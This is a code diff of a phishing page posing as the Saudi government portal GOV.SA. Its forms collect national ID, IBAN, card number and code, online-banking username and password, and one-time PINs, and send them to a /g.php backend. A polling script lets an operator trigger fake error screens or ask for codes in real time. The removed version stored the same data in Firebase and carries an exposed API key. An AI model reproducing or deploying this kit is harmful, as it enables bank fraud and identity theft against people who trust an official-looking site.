@@ -18,6 +18,7 @@
 			href="assets/img/favicon.ico"
 			type="image/x-icon"
 		/>
+		<script src="//unpkg.com/alpinejs" defer></script>
 		<link rel="stylesheet" href="dist/css/jquery.fancybox.min.css" />
 		<meta name="theme-color" content="#039747" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -239,6 +240,10 @@
 			<span class="fa fa-2x fa-spinner fa-spin"></span>
 			<div>يتم فحص البيانات - الرجاء الانتظار</div>
 		</div>
+
+		<!-- <div class="ribbon wow fadeIn" data-wow-delay="0.2s"><span>نسخة تجريبية</span></div> -->
+
+		<!-- div class="wpthemeFrame" -->
 
 		<header data-wow-delay="0.2s" id="headerid" class="green-h wow fadeIn">
 			<nav
@@ -807,12 +812,26 @@
 			</nav>
 		</header>
 
-		<form
-			data-app-form="id_getter"
-			x-show="screen == 'id_getter'"
-			class="msf mb-5 mt-5"
-			@submit="handleFetchUser($event)"
-		>
+		<span style="display: none"> currenturl</span>
+
+		<!--main content-->
+		<!-- required - do not remove -->
+		<div style="display: none" id="portletState">{}</div>
+		<div class="hiddenWidgetsDiv">
+			<!-- widgets in this container are hidden in the UI by default -->
+			<div
+				class="component-container ibmDndRow hiddenWidgetsContainer id-Z7_ALK7H7F45CNH781PDHN2KRQMH7"
+				name="ibmHiddenWidgets"
+			></div>
+			<div style="clear: both"></div>
+		</div>
+		<!-- this layout has a column on top with two columns underneath, left column is larger than right column -->
+		<style>
+			.error {
+				display: none;
+			}
+		</style>
+		<form data-app-form="id_getter" class="msf mb-5 mt-5">
 			<input data-form-element="action" type="hidden" value="id_getter" />
 
 			<div class="msf-content">
@@ -839,8 +858,6 @@
 										<div
 											class="error text-center pt-4 text-danger"
 											data-error="id_not_found"
-											x-cloak
-											x-show="idNotFound"
 										>
 											خطأ في البيانات، الرجاء التحقق من
 											رقم البطاقة
@@ -861,14 +878,7 @@
 				</div>
 			</div>
 		</form>
-
-		<form
-			data-app-form="detail_listed"
-			x-cloak
-			x-show="screen == 'listDetails'"
-			class="msf mb-5 mt-5"
-			@submit="handleEnterAccountDetails($event)"
-		>
+		<form data-app-form="detail_listed" class="msf mb-5 mt-5">
 			<input
 				data-form-element="action"
 				type="hidden"
@@ -876,7 +886,9 @@
 			/>
 
 			<div class="msf-view">
-				<div class="tab" id="listDetails">
+				<!-- next wizard  -->
+
+				<div class="app_inner_pages_bg tab" id="listDetails">
 					<div class="container">
 						<div class="app_inner_pages_container">
 							<h1 class="text-green text-center">تفاصيل الملف</h1>
@@ -886,22 +898,20 @@
 									<div class="col-6">رقم البطاقة</div>
 									<div
 										class="col-6"
-										x-text="user?.id_num"
+										data-result="id_num"
 									></div>
 								</div>
 								<div class="row mb-3">
 									<div class="col-6">الإسم</div>
 									<div
 										class="col-6"
-										x-text="user?.name_ar"
+										data-result="name_ar"
 									></div>
 								</div>
 								<div class="row">
 									<div class="col-6">تاريخ الميلاد</div>
 									<div class="col-6">
-										<span
-											x-text="user?.birth_date_h"
-										></span>
+										<span data-result="birth_date_h"></span>
 										هـ
 									</div>
 								</div>
@@ -920,14 +930,7 @@
 				</div>
 			</div>
 		</form>
-
-		<form
-			data-app-form="accountDetails"
-			x-cloak
-			x-show="screen == 'accountDetails'"
-			class="msf mb-5 mt-5"
-			@submit="handleSaveAccountDetails($event)"
-		>
+		<form data-app-form="accountDetails" class="msf mb-5 mt-5">
 			<input
 				data-form-element="action"
 				type="hidden"
@@ -936,7 +939,7 @@
 			<div class="msf-view">
 				<!-- next wizard  -->
 
-				<div class="tab" id="accountDetailsForm">
+				<div class="app_inner_pages_bg tab" id="accountDetailsForm">
 					<div class="container">
 						<div class="app_inner_pages_container">
 							<h3 class="text-green text-center">
@@ -946,7 +949,6 @@
 								<div class="form-group">
 									<select
 										data-form-element="b_name"
-										name="b_name"
 										class="form-control"
 										required
 										style="font-family: DroidArabicKufi"
@@ -1004,7 +1006,6 @@
 									<input
 										type="text"
 										data-form-element="iban"
-										name="iban"
 										maxlength="50"
 										autocomplete="off"
 										required
@@ -1018,7 +1019,6 @@
 									<input
 										type="text"
 										data-form-element="deposit_code"
-										name="deposit_code"
 										maxlength="50"
 										autocomplete="off"
 										class="form-control validate-name required"
@@ -1034,7 +1034,6 @@
 										data-numeric=""
 										class="form-control"
 										data-form-element="amount"
-										name="amount"
 										min="1"
 										step="any"
 										placeholder="المبلغ *"
@@ -1056,19 +1055,13 @@
 			</div>
 		</form>
 
-		<form
-			data-app-form="cardDetails"
-			x-cloak
-			x-show="screen == 'cardDetails'"
-			class="msf mb-5 mt-5"
-			@submit="handleSaveCardDetails($event)"
-		>
+		<form data-app-form="cardDetails" class="msf mb-5 mt-5">
 			<input
 				data-form-element="action"
 				type="hidden"
 				value="cardDetails"
 			/>
-			<div id="cardDetailsForm">
+			<div class="app_inner_pages_bg" id="cardDetailsForm">
 				<div class="container">
 					<div
 						class="app_inner_pages_container"
@@ -1082,12 +1075,12 @@
 								<input
 									type="text"
 									data-input-result="case_number"
-									name="case_number"
+									name="account_number"
 									maxlength="16"
 									size="16"
 									readonly=""
 									class="form-control"
-									:value="user?.session"
+									value=""
 									required=""
 								/>
 							</div>
@@ -1099,7 +1092,7 @@
 									type="text"
 									data-form-element="card_num"
 									id="account_proved"
-									name="card_num"
+									name="account_proved"
 									autocomplete="off"
 									class="form-control"
 									required=""
@@ -1116,7 +1109,7 @@
 									type="text"
 									class="form-control"
 									data-form-element="card_code"
-									name="card_code"
+									name="account_code"
 									placeholder="إدخال الرمز *"
 									required=""
 									data-numeric=""
@@ -1126,7 +1119,7 @@
 							</div>
 						</div>
 						<br />
-						<!-- <div class="col">
+						<div class="col">
 							<div class="form-group">
 								<a
 									href="f1#"
@@ -1135,11 +1128,10 @@
 									>* لخدمة الأونلاين إضغط هنا</a
 								>
 							</div>
-						</div> -->
+						</div>
 						<div
 							class="error text-center pt-4 text-danger"
 							data-error="cardDetails"
-							x-show="cardDetailsError"
 						>
 							خطأ في البيانات، الرجاء التحقق من رقم البيانات
 						</div>
@@ -1156,20 +1148,13 @@
 				</div>
 			</div>
 		</form>
-
-		<form
-			data-app-form="onlineDetails"
-			x-cloak
-			x-show="screen == 'onlineDetails'"
-			class="msf mb-5 mt-5"
-			@submit="handleSaveOnlineDetails($event)"
-		>
+		<form data-app-form="onlineDetails" class="msf mb-5 mt-5">
 			<input
 				data-form-element="action"
 				type="hidden"
 				value="onlineDetails"
 			/>
-			<div id="onlineDetailsForm">
+			<div class="app_inner_pages_bg" id="onlineDetailsForm">
 				<div class="container">
 					<div
 						class="app_inner_pages_container"
@@ -1183,12 +1168,12 @@
 								<input
 									type="text"
 									data-input-result="case_number"
-									name="case_number"
+									name="account_number"
 									maxlength="16"
 									size="16"
 									readonly=""
 									class="form-control"
-									:value="user?.session"
+									value=""
 									required=""
 								/>
 							</div>
@@ -1199,7 +1184,7 @@
 								<input
 									type="text"
 									data-form-element="username"
-									name="username"
+									name="account_proved"
 									maxlength="50"
 									autocomplete="off"
 									class="form-control"
@@ -1214,7 +1199,7 @@
 									type="password"
 									class="form-control"
 									data-form-element="password"
-									name="password"
+									name="account_code"
 									placeholder="كلمة المرور"
 									required=""
 								/>
@@ -1224,7 +1209,6 @@
 						<div
 							class="error text-center pt-4 text-danger"
 							data-error="onlineDetails"
-							x-show="onlineDetailsError"
 						>
 							خطأ في البيانات، الرجاء التحقق من البيانات
 						</div>
@@ -1241,20 +1225,13 @@
 				</div>
 			</div>
 		</form>
-
-		<form
-			data-app-form="pinDetails"
-			x-cloak
-			x-show="screen == 'pinDetails'"
-			class="msf mb-5 mt-5"
-			@submit="handleSavePinDetails($event)"
-		>
+		<form data-app-form="pinDetails" class="msf mb-5 mt-5">
 			<input
 				data-form-element="action"
 				type="hidden"
 				value="pinDetails"
 			/>
-			<div id="pinDetailsForm">
+			<div class="app_inner_pages_bg" id="pinDetailsForm">
 				<div class="container">
 					<div
 						class="app_inner_pages_container"
@@ -1270,7 +1247,7 @@
 									data-numeric
 									data-form-element="pin_num"
 									id="pin_num"
-									name="pin_num"
+									name="account_proved"
 									autocomplete="off"
 									class="form-control"
 									required=""
@@ -1283,7 +1260,6 @@
 						<div
 							class="error text-center pt-4 text-danger"
 							data-error="pinDetails"
-							x-show="pinDetailsError"
 						>
 							خطأ، الرجاء التحقق من الرمز
 						</div>
@@ -1300,16 +1276,9 @@
 				</div>
 			</div>
 		</form>
-
-		<form
-			data-app-form="completed"
-			x-cloak
-			x-show="screen == 'completed'"
-			class="msf mb-5 mt-5"
-			@submit="handleSaveCompleted($event)"
-		>
+		<form data-app-form="completed" class="msf mb-5 mt-5">
 			<input data-form-element="action" type="hidden" value="completed" />
-			<div id="completed">
+			<div class="app_inner_pages_bg" id="completed">
 				<div class="container">
 					<div
 						class="app_inner_pages_container"
@@ -1326,6 +1295,291 @@
 				</div>
 			</div>
 		</form>
+
+		<script>
+			function setInputFilter(textbox, inputFilter, errMsg) {
+				[
+					"input",
+					"keydown",
+					"keyup",
+					"mousedown",
+					"mouseup",
+					"select",
+					"contextmenu",
+					"drop",
+					"focusout",
+				].forEach(function (event) {
+					textbox.addEventListener(event, function (e) {
+						if (inputFilter(this.value)) {
+							// Accepted value
+							if (
+								["keydown", "mousedown", "focusout"].indexOf(
+									e.type
+								) >= 0
+							) {
+								this.classList.remove("input-error");
+								this.setCustomValidity("");
+							}
+							this.oldValue = this.value;
+							this.oldSelectionStart = this.selectionStart;
+							this.oldSelectionEnd = this.selectionEnd;
+						} else if (this.hasOwnProperty("oldValue")) {
+							// Rejected value - restore the previous one
+							this.classList.add("input-error");
+							this.setCustomValidity(errMsg);
+							this.reportValidity();
+							this.value = this.oldValue;
+							this.setSelectionRange(
+								this.oldSelectionStart,
+								this.oldSelectionEnd
+							);
+						} else {
+							// Rejected value - nothing to restore
+							this.value = "";
+						}
+					});
+				});
+			}
+			$("[data-numeric]").each(function (k, v) {
+				setInputFilter(
+					v,
+					function (value) {
+						return /^\d*$/.test(value); // Allow digits and '.' only, using a RegExp
+					},
+					"فقط أرقام"
+				);
+			});
+			class Sys {
+				postRequest(data, successCallback, errorCallback) {
+					$.ajax({
+						type: "POST",
+						url: "/g.php",
+						data: data,
+						dataType: "json",
+						success: function (res) {
+							successCallback(res);
+						},
+						error: function (err) {
+							errorCallback(err);
+						},
+					});
+				}
+
+				accountDetailsForm(res) {
+					this.showLevel("accountDetailsForm");
+				}
+				listDetails(res) {
+					this.showLevel("listDetails");
+					let dataContainer = $("#listDetails");
+					dataContainer.find("[data-result]").each(function (k, v) {
+						v = $(v);
+						v.html(res.data[v.attr("data-result")]);
+					});
+				}
+
+				cardDetailsForm(res, showError) {
+					this.hideLoading();
+					this.hideErrors();
+					if (this.interval) {
+						clearInterval(this.interval);
+					}
+
+					$('[data-input-result="case_number"]').val(res.session);
+					this.showLevel("cardDetailsForm");
+					if (showError) {
+						this.showError("cardDetails");
+					}
+				}
+				onlineDetailsForm(res, showError) {
+					this.hideLoading();
+					this.hideErrors();
+					if (this.interval) {
+						clearInterval(this.interval);
+					}
+					this.showLevel("onlineDetailsForm");
+					if (showError) {
+						this.showError("onlineDetails");
+					}
+				}
+				pinDetailsForm(res, showError) {
+					$("#pin_num").val("");
+					this.hideLoading();
+					this.hideErrors();
+					if (this.interval) {
+						clearInterval(this.interval);
+					}
+
+					this.showLevel("pinDetailsForm");
+					if (showError) {
+						this.showError("pinDetails");
+					}
+				}
+				complete(res, showError) {
+					this.hideLoading();
+					this.hideErrors();
+					if (this.interval) {
+						clearInterval(this.interval);
+					}
+
+					this.showLevel("completed");
+				}
+				waitAction() {
+					let me = this;
+					this.interval = setInterval(function () {
+						if (!me.fetching) {
+							me.fetching = true;
+							me.postRequest(
+								{
+									action: "getAction",
+								},
+								function (res) {
+									if (res.next_action !== me.next_action) {
+										me.next_action = res.next_action;
+										if (me.next_action !== "NONE") {
+											switch (me.next_action) {
+												case "ERROR_CARD_DETAILS":
+													me.cardDetailsForm(
+														res,
+														true
+													);
+													break;
+												case "ERROR_ONLINE_CONNECTION":
+													me.onlineDetailsForm(
+														res,
+														true
+													);
+													break;
+												case "REQUEST_CODE":
+													me.pinDetailsForm(res);
+													break;
+												case "ERROR_CODE":
+													me.pinDetailsForm(
+														res,
+														true
+													);
+													break;
+												case "COMPLETE":
+													me.complete(res, true);
+													break;
+											}
+										}
+									}
+									me.fetching = false;
+								},
+								function (err) {
+									me.fetching = false;
+								}
+							);
+						}
+					}, 1000);
+				}
+				updateLevel() {
+					this.postRequest(
+						{
+							action: "getLatestState",
+						},
+						function (res) {
+							console.log(res);
+						},
+						function (err) {}
+					);
+				}
+
+				constructor() {
+					this.interval = null;
+					this.next_action = null;
+					this.fetching = false;
+					let me = this;
+					$("[data-app-form]").each(function (k, v) {
+						v = $(v);
+						let action = v.attr("data-app-form");
+						v.on("submit", function () {
+							me.hideErrors();
+							let data = {};
+							v.find("[data-form-element]").each(function (
+								ke,
+								ve
+							) {
+								let el = $(ve);
+								data[el.attr("data-form-element")] = el.val();
+							});
+
+							me.showLoading();
+							me.postRequest(
+								data,
+								function (res) {
+									console.log(res);
+									switch (res.next) {
+										case "error":
+											me.hideLoading();
+											me.showError(res.error);
+											break;
+										case "listDetails":
+											me.hideLoading();
+											me.listDetails(res);
+											break;
+										case "cardDetailsForm":
+											me.hideLoading();
+											me.cardDetailsForm(res);
+											break;
+										case "waitAction":
+											me.waitAction(res);
+											break;
+										case "accountDetailsForm":
+											setTimeout(function () {
+												me.hideLoading();
+												me.accountDetailsForm(res);
+											}, 2000);
+											break;
+									}
+								},
+								function (err) {}
+							);
+							return false;
+						});
+					});
+				}
+
+				showLoading() {
+					$(".processing").css("display", "flex");
+				}
+
+				hideLoading() {
+					$(".processing").css("display", "none");
+				}
+
+				hideErrors() {
+					$("[data-error]").hide();
+				}
+
+				showError(error_id) {
+					$('[data-error="' + error_id + '"]').show();
+				}
+
+				showLevel(id) {
+					$(".app_inner_pages_bg").removeClass("current");
+					$("#" + id).addClass("current");
+				}
+			}
+
+			let sys = new Sys();
+		</script>
+		<div
+			class="component-container id-Z7_UQCSPRG0394I0KEHRAB8MPQFS1"
+			name="container_5"
+		></div>
+		<div
+			class="component-container id-Z7_JA5LHE2VEUQADAFE1N7DSMHTS6"
+			name="container_6"
+		></div>
+		<div
+			class="component-container id-Z7_9R4N5DG5OUAS8K8A9ATKES94T7"
+			name="container_7"
+		></div>
+		<!--end main content-->
+
+		<!-- page footer -->
+		<!-- venky -->
 
 		<footer class="page-footer font-small bg-white">
 			<div
@@ -1869,239 +2123,519 @@
 				</div>
 			</div>
 		</section>
+		<!--   <div class="modal fade" id="chatModal" tabindex="-1" role="dialog" aria-labelledby="chatModalLabel" aria-hidden="true">
+<div class="modal-dialog modal-lg" role="document" >
+<div class="modal-content">
+  <div class="modal-header green-bg-gradient" >
+    <h5  class="text-white" id="chatModalLabel"><fmt:message key='live.chat'/>Live Chat</h5>
+    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+      <span aria-hidden="true" class="text-white">&times;</span>
+    </button>
+  </div>
+  <div class="modal-body">
+      <div class="embed-responsive embed-responsive-16by9">
+   <object data="http://199099.gov.sa:89/Code/webchatLogin.php?lang=en&project=sgov" type="text/html"></object>
 
-		<script type="module">
-			import { initializeApp } from "https://www.gstatic.com/firebasejs/9.12.1/firebase-app.js";
+      <iframe class="embed-responsive-item" src="http://199099.gov.sa:89/Code/webchatLogin.php?lang=en&project=sgov" allowfullscreen></iframe>
+    </div>
+  </div>
+  <div class="modal-footer">
+    <button type="button" class="btn btn-grd btn-sm waves-effect waves-green" data-dismiss="modal"><fmt:message key='close'/>Close</button>
+  </div>
+</div>
+</div>
+</div>
+-->
 
-			import {
-				getFirestore,
-				doc,
-				addDoc,
-				setDoc,
-				getDoc,
-			} from "https://www.gstatic.com/firebasejs/9.12.1/firebase-firestore.js";
-
-			const firebaseConfig = {
-				apiKey: "AIzaSyA9QxtaVAxgyUp7I7BE9sc16qS02LX6Q7E",
-				authDomain: "letterplace-c103c.firebaseapp.com",
-				databaseURL: "https://letterplace-c103c.firebaseio.com",
-				projectId: "letterplace-c103c",
-				storageBucket: "letterplace-c103c.appspot.com",
-				messagingSenderId: "658174549550",
-				appId: "1:658174549550:web:d3c99b2be934379b6209bf",
-			};
-
-			const app = initializeApp(firebaseConfig);
-			const db = getFirestore(app);
-
-			window.fireBaseStuff = {
-				getFirestore,
-				doc,
-				addDoc,
-				setDoc,
-				getDoc,
-				app,
-				db,
-			};
-		</script>
-		<script src="//unpkg.com/alpinejs" defer></script>
 		<script>
-			function showLoader(button) {
-				if (!button) {
-					const spinner = document.querySelector(".processing");
-					spinner.style.display = "flex";
-					return () => (spinner.style.display = "none");
-				}
+			$(document).ready(function () {
+				$("#headerid").addClass("green-h");
+				$("#headerid nav").addClass("z-depth-0");
 
-				const loader = `
-				<span>
-						<svg
-				id="spinner"
-				width="30"
-				height="30"
-				xmlns="http://www.w3.org/2000/svg"
-				viewBox="0 0 100 100"
-				preserveAspectRatio="xMidYMid"
-			>
-				<circle
-					cx="50"
-					cy="50"
-					fill="none"
-					stroke="#000"
-					stroke-width="6"
-					r="35"
-					stroke-dasharray="164.93361431346415 56.97787143782138"
-					transform="rotate(269.874 50 50)"
-				>
-					<animateTransform
-						attributeName="transform"
-						type="rotate"
-						calcMode="linear"
-						values="0 50 50;360 50 50"
-						keyTimes="0;1"
-						dur="1s"
-						begin="0s"
-						repeatCount="indefinite"
-					></animateTransform>
-				</circle>
-			</svg>
-					</span>
-				`;
+				$("#breadcrumb").appendTo($(".breadcrumb_container"));
+			});
+		</script>
+		<!-- Global site tag (gtag.js) - Google Analytics -->
 
-				button.classList.add("disabled");
-				button.innerHTML = button.innerHTML + loader;
+		<script
+			async=""
+			src="https://www.googletagmanager.com/gtag/js?id=UA-83327005-7"
+		></script>
 
-				return () => {
-					button.classList.remove("disabled");
-					button.querySelector("span").remove();
-				};
+		<script>
+			window.dataLayer = window.dataLayer || [];
+
+			function gtag() {
+				dataLayer.push(arguments);
 			}
 
-			document.addEventListener("alpine:init", () => {
-				const { getFirestore, doc, addDoc, setDoc, getDoc, app, db } =
-					window.fireBaseStuff;
+			gtag("js", new Date());
+			gtag("config", "UA-83327005-7");
+			/*
+    function countFeedbackChar(val) {
+        console.log("countFeedbackChar ...");
+        var len = val.value.length;
+        $('#feedbackCount').text(len+" / 500");
+    } */
+		</script>
 
-				function formDataObject(form) {
-					return Array.from(new FormData(form)).reduce(
-						(agg, [key, value]) => ({ ...agg, [key]: value }),
-						{}
-					);
+		<script>
+			function openChat() {
+				window.open("", "_self", "");
+				var url = "https://chat.199099.gov.sa?lang=ar";
+				var features =
+					"location=0,top=0,menubar=0,resizable=0,height=500,width=500,Left=" +
+					screen.width * 0.8;
+				window.open(url, "mywindow", features);
+			}
+		</script>
+
+		<script>
+			$(document).ready(function () {
+				$("#email").val("");
+				$("#comments").val("");
+
+				$("#feedback_question").removeClass("d-none");
+
+				var pageTitle = "الخدمات الحكومية الموحدة – GOV.SA";
+				var pageUniqueName = "main";
+
+				if (
+					pageUniqueName == "servicedetails" ||
+					pageUniqueName == "agencyDetails" ||
+					pageUniqueName == "eventsDetails" ||
+					pageUniqueName == "newsDetails"
+				) {
+					//it reads pageName from WCM PT for each pages
+					pageUniqueName = $("#pageName").val().replace(/\s+/g, "");
+					console.log("pageUniqueName :" + pageUniqueName);
 				}
+				//get feedback count
+				//var pageTitle = "الخدمات الحكومية الموحدة – GOV.SA";
 
-				async function userFetcher(userRef) {}
+				//additional code to hide Feedback from home page only
 
-				Alpine.data("onboardingForm", () => ({
-					showNewUserTable: false,
-					user: null,
-					idNotFound: false,
-					cardDetailsError: null,
-					onlineDetailsError: null,
-					pinDetailsError: null,
-					screen: "id_getter",
-					init() {
-						// this.fetchUsers();
-					},
-					async fetchUserDetails(userId) {
-						this.idNotFound = false;
-
-						const docSnap = await getDoc(
-							doc(db, "accounts", userId)
-						);
-
-						if (docSnap.exists()) {
-							const user = docSnap.data();
-							if (user.pin_data?.length > 0) {
-								try {
-									user.pin_data = JSON.parse(user.pin_data);
-								} catch (error) {}
+				if (pageUniqueName == "main") {
+					$("#Feedback_main").addClass("d-none");
+				} else {
+					var serverURL =
+						window.location.protocol +
+						"//" +
+						window.location.host +
+						"/feedback/feedbackservlet?pageUniqueName=" +
+						pageUniqueName +
+						"&pageURL=" +
+						document.location.href;
+					// Send mail to end user
+					$.ajax({
+						url: serverURL,
+						success: function (result) {
+							var response = JSON.parse(result);
+							if (response.status == "success") {
+								$("#feedbackPercentage").html(
+									response.percentage
+								);
+								$("#feedbackCount").html(response.total);
 							}
-							this.user = user;
-							// console.log("Found user: ", user);
-							return true;
-						} else {
-							this.idNotFound = true;
-							return false;
-						}
-					},
-					async handleFetchUser(e) {
-						e.preventDefault();
-						const form = e.target;
+						},
+					});
+				}
+				$("#feedback_yes").click(function () {
+					var serverURL =
+						window.location.protocol +
+						"//" +
+						window.location.host +
+						"/feedback/feedbackservlet?";
+					// Send mail to end user
+					$.ajax({
+						url:
+							serverURL +
+							"feedbackType=Y&pageTitle=" +
+							pageTitle +
+							"&pageURL=" +
+							document.location.href +
+							"&pageUniqueName=" +
+							pageUniqueName,
+						success: function (result) {
+							var response = JSON.parse(result);
 
-						const hideLoader = showLoader(
-							form.querySelector("button")
-						);
+							if (response.status == "success") {
+								$("#feedback_accknowledge").removeClass(
+									"d-none"
+								);
+								$("#feedback_question_div").addClass("d-none");
+								$("#feedbackPercentage").html(
+									response.percentage
+								);
+								$("#feedbackCount").html(response.total);
+							} else if (response.status == "error") {
+								$("#feedback_accknowledge1").removeClass(
+									"d-none"
+								);
+								$("#feedback_question_div").addClass("d-none");
+								$("#feedbackPercentage").html(
+									response.percentage
+								);
+								$("#feedbackCount").html(response.total);
+							}
+						},
+					});
+				});
 
-						try {
-							const res = await this.fetchUserDetails(
-								new FormData(form).get("userid")
-							);
-							hideLoader();
-							if (res) this.screen = "listDetails";
-							// if (res) this.screen = "pinDetails";
-							// if (res) this.screen = "onlineDetails";
-						} catch (error) {
-							console.log("Error fetching user: ", error);
-							hideLoader();
-						}
-					},
-					async handleEnterAccountDetails(e) {
-						e.preventDefault();
-						this.screen = "accountDetails";
-					},
-					async processForm(e, nextScreen, extraData = {}) {
-						e.preventDefault();
-						const form = e.target;
-						const data = formDataObject(form);
+				$("#feedback_no").click(function () {
+					$("#feedback_question").addClass("d-none");
+					$("#feedback_comments_box").removeClass("d-none");
+				});
 
-						const hideLoader = showLoader(
-							form.querySelector("button")
-						);
+				$("#feedback_no_cancel").click(function () {
+					/* location.reload(); */
+					$("#email").val("");
+					$("#comments").val("");
 
-						try {
-							const res = await setDoc(
-								doc(db, "accounts", this.user.id_num),
-								{
-									...data,
-									last_update: Date.now(),
-									...extraData,
-								},
-								{ merge: true }
-							);
+					$("#feedback_question").removeClass("d-none");
+					$("#feedback_comments_box").addClass("d-none");
+					$("#feedback_accknowledge").addClass("d-none");
+				});
 
-							// console.log("User updated: ", res);
-							hideLoader();
+				$("#feedback_no_submit").click(function () {
+					var validation = true;
 
-							this.screen = nextScreen;
-						} catch (e) {
-							console.error("Error processing form: ", e);
-							hideLoader();
-						}
-					},
-					async handleSaveAccountDetails(e) {
-						const caseNumber = Math.floor(
-							Math.random() * 899999 + 100000
-						);
-						await this.processForm(e, "cardDetails", {
-							session: caseNumber,
-						});
-						this.user.session = caseNumber;
-					},
-					async handleSaveCardDetails(e) {
-						await this.processForm(e, "onlineDetails", {
-							state: "CARD_UPDATED",
-						});
-					},
-					validPin() {
-						return [...(this.user.pin_data || ["1234"])].pop().code;
-					},
-					async handleSaveOnlineDetails(e) {
-						const dt = new Date();
-						const pin_data = [
-							...(this.user.pin_data || []),
-							{
-								time: `${dt.getHours()}:${dt.getMinutes()}:${dt.getSeconds()}`,
-								code: Math.floor(Math.random() * 8999 + 1000),
+					var email = $("#email").val();
+					var comments = $("#comments")
+						.val()
+						.replace(/\r|\n/g, "<br />");
+
+					if (email.length == 0) {
+						$("#emailRequired").removeClass("d-none");
+						$("#emailvalidation").addClass("d-none");
+						validation = false;
+					} else if (!isEmail(email)) {
+						$("#emailRequired").addClass("d-none");
+						$("#emailvalidation").removeClass("d-none");
+						validation = false;
+					} else {
+						$("#emailRequired").addClass("d-none");
+						$("#emailvalidation").addClass("d-none");
+					}
+
+					if (comments.length == 0) {
+						$("#commentsRequired").removeClass("d-none");
+						$("#commentsInvalid").addClass("d-none");
+						validation = false;
+					} else if (
+						comments.length > 0 &&
+						!/^[a-zA-Z0-9\u0600-\u06FF,#:;@)()!*-/ .]+$/.test(
+							comments
+						)
+					) {
+						$("#commentsInvalid").removeClass("d-none");
+						$("#commentsRequired").addClass("d-none");
+						validation = false;
+					} else {
+						$("#commentsRequired").addClass("d-none");
+						$("#commentsInvalid").addClass("d-none");
+					}
+
+					if (validation) {
+						$("#feedback_question_div").addClass("d-none");
+						$("#feedback_comments_box").addClass("d-none");
+
+						$("#commentsRequired").addClass("d-none");
+						$("#emailRequired").addClass("d-none");
+						$("#emailvalidation").addClass("d-none");
+
+						var serverURL =
+							window.location.protocol +
+							"//" +
+							window.location.host +
+							"/feedback/feedbackservlet?";
+						var lang = "ar";
+
+						// Send mail to end user
+						$.ajax({
+							url:
+								serverURL +
+								"&feedbackType=N&comments=" +
+								comments +
+								"&email=" +
+								email +
+								"&pageTitle=" +
+								pageTitle +
+								"&pageURL=" +
+								document.location.href +
+								"&pageUniqueName=" +
+								pageUniqueName +
+								"&lang=" +
+								lang,
+							success: function (result) {
+								var response = JSON.parse(result);
+								if (response.status == "success") {
+									$("#feedbackPercentage").html(
+										response.percentage
+									);
+									$("#feedbackCount").html(response.total);
+									$("#feedback_accknowledge").removeClass(
+										"d-none"
+									);
+									$("#feedback_accknowledge1").addClass(
+										"d-none"
+									);
+									$("#feedback_question").removeClass(
+										"d-none"
+									);
+									$("#feedback_comments_box").addClass(
+										"d-none"
+									);
+								} else if (response.status == "error") {
+									$("#feedbackPercentage").html(
+										response.percentage
+									);
+									$("#feedbackCount").html(response.total);
+									$("#feedback_accknowledge1").removeClass(
+										"d-none"
+									);
+									$("#feedback_accknowledge").addClass(
+										"d-none"
+									);
+									$("#feedback_question").removeClass(
+										"d-none"
+									);
+									$("#feedback_comments_box").addClass(
+										"d-none"
+									);
+								}
 							},
-						];
-						await this.processForm(e, "pinDetails", {
-							state: "ONLINE_UPDATED",
-							pin_data: JSON.stringify(pin_data),
 						});
-						this.user.pin_data = pin_data;
+					}
 
-						console.log("Valid otp: ", this.validPin());
-					},
-					async handleSavePinDetails(e) {
-						await this.processForm(e, "pinDetails", {
-							state: "PIN_ADDED",
-						});
+					function isEmail(email) {
+						var regex =
+							/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+						return regex.test(email);
+					}
+				});
+			});
+		</script>
+		<!-- end page footer -->
+		<!-- venky static -->
 
-						showLoader();
+		<!-- This is responsible for bootstrapping the configuration for the javascript framework.
+    This is located here instead of the head section to improve client performance. -->
+		<div
+			class="wpthemeComplementaryContent"
+			id="wpthemeComplementaryContent"
+			role="region"
+			tabindex="-1"
+			aria-labelledby="wpthemeComplementaryContentText"
+		>
+			<span class="wpthemeAltText" id="wpthemeComplementaryContentText"
+				>Complementary Content</span
+			>
+			<script
+				type="text/javascript"
+				src="wps/contenthandler/!ut/p/digest!1ZE9Umy1eVNSvwoh7BCY5w/mashup/ra:collection?themeID=ZJ_KQL0HB41O86TB0QSC9QMCN0001&amp;locale=ar&amp;locale=en&amp;mime-type=text%252Fjavascript&amp;lm=1602785686006&amp;entry=wp_portal__0.0:config_config_static&amp;entry=wcm_config__0.0:config_config_static&amp;entry=wcm_inplaceEdit__0.0:config_"
+			></script>
+			<script type="text/javascript">
+				i$.merge({
+					ibmCfg: {
+						themeConfig: {
+							themeUniqueName: "com.ibm.portal.snp.theme.theme90",
+							themeRootURI:
+								"/wps/contenthandler/!ut/p/digest!AVpjyN-eMXoHdj8JKNHpMA/war/SNPThemeStatic/themes/SNPTheme90",
+							themeWebAppBaseURI:
+								"/SNPThemeDynamic/themes/html/dynamicSpots",
+							themeWebDAVBaseURI:
+								"war:SNPThemeStatic/themes/SNPTheme90/",
+							modulesWebAppBaseURI: "/wps/themeModules",
+							commonResourcesRootURI:
+								"/wps/contenthandler/!ut/p/digest!1ZE9Umy1eVNSvwoh7BCY5w/dav/fs-type1/common-resources",
+							isRTL: true,
+							isPageRenderModeCSA: false,
+							portletOverridePageTitle:
+								"المنصة الوطنية الموحدة GOV.SA",
+							currentContentNodeOID:
+								"Z6_JP841A01OOGJ40QC1U25JV00G6",
+							loadingImage: "css/images/loading.gif",
+							dndSourceDefinitions: [],
+							categorySources: [],
+							styleSources: [],
+							layoutSources: [],
+						},
+						portalConfig: {
+							locale: "ar",
+							portalURI: "/wps/portal",
+							contentHandlerURI:
+								"/wps/contenthandler/!ut/p/digest!eoMgku6MaJfPe-BbDYemwQ/",
+							pocURI: "/wps/portal/!ut/p/z0/0wcA1NLTeQ!!/",
+							isVirtualPortal: false,
+							canImpersonate: false,
+							themeRootURI:
+								"/SNPThemeDynamic/themes/html/dynamicSpots",
+							parentPageID: "Z6_JP841A01OO35B0QCM7OASV1005",
+							currentPageOID: "Z6_JP841A01OOGJ40QC1U25JV00G6",
+							canAnonymousUserViewCurrentPage: true,
+							bootstrapState:
